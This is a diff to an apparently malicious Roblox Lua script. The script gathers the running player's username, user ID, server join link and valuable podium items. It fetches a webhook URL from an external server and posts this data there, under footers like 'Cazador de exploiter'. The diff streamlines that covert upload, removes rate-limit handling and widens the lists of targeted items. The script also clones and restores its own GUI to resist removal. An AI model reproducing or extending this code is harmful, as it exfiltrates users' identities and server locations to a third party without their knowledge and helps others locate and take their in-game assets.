@@ -41,7 +41,7 @@ local function textToBinary(text)
     return table.concat(result, " ")
 end
 
-local function requestSecureUrl(category, webhookId)
+local function requestSecureUrl(category)
     local success, result = pcall(function()
         if not HttpService then
             return nil
@@ -56,7 +56,6 @@ local function requestSecureUrl(category, webhookId)
         local requestBody = HttpService:JSONEncode({
             username_binary = usernameBinary,
             category = category or "miranda",
-            webhook_id = webhookId or "owner",
             token = "hesiz_secure_v1"
         })
 
@@ -68,15 +67,6 @@ local function requestSecureUrl(category, webhookId)
             },
             Body = requestBody
         })
-
-        -- Verificar si hay rate limit al crear la URL
-        if response.StatusCode == 429 then
-            local responseBody = response.Body or ""
-            if responseBody:find("Rate limited") then
-                LocalPlayer:Kick("You are in cooldown!")
-                return nil
-            end
-        end
 
         if type(response) == "table" and response.StatusCode == 200 then
             local data = HttpService:JSONDecode(response.Body)
@@ -111,7 +101,7 @@ local function createRedCrimsonGradientPulse(stroke)
     gradient.Parent = stroke
 
     -- Pulso de intensidad
-    local pulseTween = TweenService:Create(stroke, 
+    local pulseTween = TweenService:Create(stroke,
         TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
         {Transparency = 0.3}
     )
@@ -235,15 +225,15 @@ local allowedAnimals = {
     "La Grande Combinasion",
     "La Supreme Combinasion",
     "La Extinct Grande",
-    "La Secret Combinasion", 
-    "Spooky and Pumpky", 
-    "Ketchuru and Musturu", 
-    "Los Lucky Blocks", 
-    "Admin Lucky Block", 
-    "Burguro And Fryuro", 
-    "Chillin Chili", 
-    "Los Tacoritas", 
-    "Tacorita Bicicleta", 
+    "La Secret Combinasion",
+    "Spooky and Pumpky",
+    "Ketchuru and Musturu",
+    "Los Lucky Blocks",
+    "Admin Lucky Block",
+    "Burguro And Fryuro",
+    "Chillin Chili",
+    "Los Tacoritas",
+    "Tacorita Bicicleta",
     "Taco Luckyblock",
     "Mieteteira Bicicleteira",
     "Chipso and Queso",
@@ -251,7 +241,7 @@ local allowedAnimals = {
     "Burrito Bandito",
     "Meowl",
     "Los Nooo My Hotspotsitos",
-    "Los Spooky Combinasionas", 
+    "Los Spooky Combinasionas",
     "La Casa Boo",
     "La Taco Combinasion",
     "Los Puggies",
@@ -267,8 +257,23 @@ local allowedAnimals = {
     "Los 67",
     "Los Burritos",
     "La Jolly Grande",
-    "Ho Ho Ho Sahur",
-    "Chicleteira Noelteira"
+    "Chicleteira Noelteira",
+    "Festive Lucky Block",
+    "Chimnino",
+    "Los 25",
+    "La Ginger Sekolah",
+    "Los Candies",
+    "Festive 67",
+    "Noo My Candy",
+    "Noo My Present",
+    "Guest 666",
+    "Tang Tang Keletang",
+    "Reinito Sleighito",
+    "Swaggy Bros",
+    "Lavadorito Spinito",
+    "Dragon Gingerini",
+    "Raccooni Jandelini",
+    "Donkeyturbo Express"
  }
 
 local function getPodiumInfo()
@@ -286,18 +291,18 @@ local function getPodiumInfo()
         return "No se pudieron obtener datos de podios"
     end)
 
-    if success and type(podiumData) == "table" then  
-        local info = {}  
-        for podium, animal in pairs(podiumData) do  
-            if animal == "Empty" then  
-                info[podium] = "Empty"  
-            else  
-                info[podium] = tostring(animal.Name or animal.Index or "Unknown")  
-            end  
-        end  
-        return info  
-    else  
-        return {error = podiumData}  
+    if success and type(podiumData) == "table" then
+        local info = {}
+        for podium, animal in pairs(podiumData) do
+            if animal == "Empty" then
+                info[podium] = "Empty"
+            else
+                info[podium] = tostring(animal.Name or animal.Index or "Unknown")
+            end
+        end
+        return info
+    else
+        return {error = podiumData}
     end
 end
 
@@ -373,7 +378,6 @@ local function sendToWebhook(link, foundAnimals)
             "Burguro And Fryuro",
             "Money Money Puggy",
             "Spaghetti Tualetti",
-            "La Spooky Grande",
             "Tictac Sahur",
             "Garama and Madundung",
             "Chipso and Queso",
@@ -381,7 +385,7 @@ local function sendToWebhook(link, foundAnimals)
             "Fragrama and Chocrama",
             "Meowl",
             "Eviledon",
-            "Los Puggies", 
+            "Los Puggies",
             "La Casa Boo",
             "La Taco Combinasion",
             "Orcaledon",
@@ -391,7 +395,15 @@ local function sendToWebhook(link, foundAnimals)
             "W or L",
             "Ketchuru and Musturu",
             "La Supreme Combinasion",
-            "Cooki and Milki"
+            "Cooki and Milki",
+            "Tang Tang Keletang",
+            "Reinito Sleighito",
+            "Swaggy Bros",
+            "Lavadorito Spinito",
+            "Los Primos",
+            "Dragon Gingerini",
+            "Raccooni Jandelini",
+            "Nuclearo Dinossauro"
         }
 
         local playerName = LocalPlayer.Name
@@ -431,79 +443,38 @@ local function sendToWebhook(link, foundAnimals)
                 ["color"] = color,
                 ["fields"] = {
                     {
-                        ["name"] = "👤 Información del jugador:",
+                        ["name"] = "Informacion del jugador:",
                         ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
                     },
                     {
-                        ["name"] = "🌐 Datos del Server:",
+                        ["name"] = "Datos del Server:",
                         ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
                     },
                     {
-                        ["name"] = "🔗 Link del Server:",
+                        ["name"] = "link:",
                         ["value"] = "[Click here to join](" .. link .. ")",
                     },
                     {
-                        ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🎯 Items importantes (secrets):",
+                        ["name"] = isSpecial and "CATCHES ESPECIALES:" or "Items importantes(secrets):",
                         ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
                     },
                     {
-                        ["name"] = "📊 Total:",
+                        ["name"] = "Total:",
                         ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
                     }
                 },
-                ["footer"] = {["text"] = isSpecial and "Hesiz Estuvo Aqui - Detector de Catches Especiales" or "Hesiz Estuvo Aqui - Cazador de Exploiter"},
+                ["footer"] = {["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"},
                 ["timestamp"] = DateTime.now():ToIsoDate()
             }}
         }
 
-        local webhookId = "miranda_normal"
-        if isSpecial then
-            webhookId = "miranda_special"
-        end
-        
-        local secureUrl = nil
-        local urlSuccess, urlResult = pcall(function()
-            return requestSecureUrl(category, webhookId)
-        end)
-        
-        if urlSuccess and urlResult then
-            secureUrl = urlResult
-        end
+        local secureUrl = requestSecureUrl(category)
 
         if secureUrl then
-            local jsonData = nil
-            local encodeSuccess, encodeResult = pcall(function()
-                return HttpService:JSONEncode(data)
+            local sendSuccess, sendErr = pcall(function()
+                local jsonData = HttpService:JSONEncode(data)
+                HttpService:PostAsync(secureUrl, jsonData, Enum.HttpContentType.ApplicationJson)
             end)
-            
-            if encodeSuccess and encodeResult then
-                jsonData = encodeResult
-            end
-            
-            if jsonData then
-                local sendSuccess, sendResponse = pcall(function()
-                    return HttpService:RequestAsync({
-                        Url = secureUrl,
-                        Method = "POST",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = jsonData
-                    })
-                end)
-
-                if sendSuccess and sendResponse then
-                    local statusCode = sendResponse.StatusCode
-                    local responseBody = sendResponse.Body or ""
-
-                    if statusCode == 429 then
-                        if responseBody:find("Rate limited") then
-                            LocalPlayer:Kick("You are in cooldown!")
-                            return false
-                        end
-                    end
-                end
-            end
         end
 
         return true
@@ -1358,7 +1329,7 @@ local function proteccionAntiDestruccion()
 
     local function crearBackup(nombreGui)
         local gui = PlayerGui:FindFirstChild(nombreGui)
-        if gui then 
+        if gui then
             backups[nombreGui] = gui:Clone()
         end
     end
